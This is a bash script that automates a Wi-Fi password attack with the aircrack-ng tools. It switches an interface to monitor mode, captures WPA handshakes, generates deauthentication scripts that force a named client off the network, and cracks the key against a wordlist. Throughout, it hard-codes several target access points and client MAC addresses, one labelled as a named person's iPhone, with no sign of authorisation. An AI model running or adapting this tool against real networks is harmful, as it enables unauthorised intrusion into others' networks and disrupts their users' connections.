#!/bin/bash

function reset(){
    airmon-ng stop $ifmon
    nmcli radio wifi off
    sleep 0.5
    nmcli radio wifi on
}

function toMonitor(){
    airmon-ng start $ifname
    #iwconfig $ifmon freq $channel
    iwconfig $ifmon freq $wkfreq
}

function injectTest(){
    aireplay-ng -9 -e $SSID -a $BSSID $ifmon
}

function dump(){
    airodump-ng -c $channel --bssid $BSSID -w $capPrefix $ifmon
}

function crack(){
    local pwdfile="pwd.txt"
    aircrack-ng -w ./pwd.lst -b $BSSID $capPrefix*.cap
    #aircrack-ng -w ./pwd.lst -b $BSSID $capPrefix*.cap | grep "KEY FOUND!" | tee $pwdfile
}

function genDeAuthenScript(){
    local scriptName="${SSID}-script-deAuthen-${cli}.sh"
    if [ ! -s $scriptName ];then
	cat > $scriptName <<EOF
#!/bin/bash

#autoGen do not edit it

aireplay-ng -0 1 -a $BSSID -c $cli $ifmon
EOF
	chmod a+x $scriptName
    fi
}

function genCheckScript(){
    local scriptName="${SSID}-script-checkCli.sh"
    if [ ! -s $scriptName ];then
	cat > $scriptName <<EOF
#!/bin/bash

airmon-ng start $ifname
airodump-ng -c $channel --essid ${SSID} --bssid $BSSID $ifmon
airmon-ng stop $ifmon

EOF
	chmod a+x $scriptName
    fi
}

function docrack(){
    reset
    toMonitor
    injectTest
    dump
    crack
    reset
}

function main(){
    genDeAuthenScript
    genCheckScript
    if [ $# -gt 0 ];then
	docrack
    fi
}

#BSSID="6C:B0:CE:17:AD:71"
#SSID="phome-wndr"
#channel="3"
#cli="50:68:0A:D5:02:B4"

#BSSID="14:CF:92:BC:A9:4D"
#SSID="InspurHot"
#channel="10"
#cli="9C:AD:97:D1:4F:31"

BSSID="EC:88:8F:43:97:58"
SSID="Inspur-M"
channel="6"
cli="60:D9:C7:00:22:CA"		    #rowan iPhone5s

#BSSID="70:F9:6D:34:FB:91"
#SSID="Inspur"
#channel="11"
#cli="E8:2A:EA:AE:7D:47"

let chnum=${channel}-1
let wkfreq=2412000000+5000000*$chnum
capPrefix="$SSID-$BSSID"
ifname="wlp2s0"
ifmon="${ifname}mon"

main $@
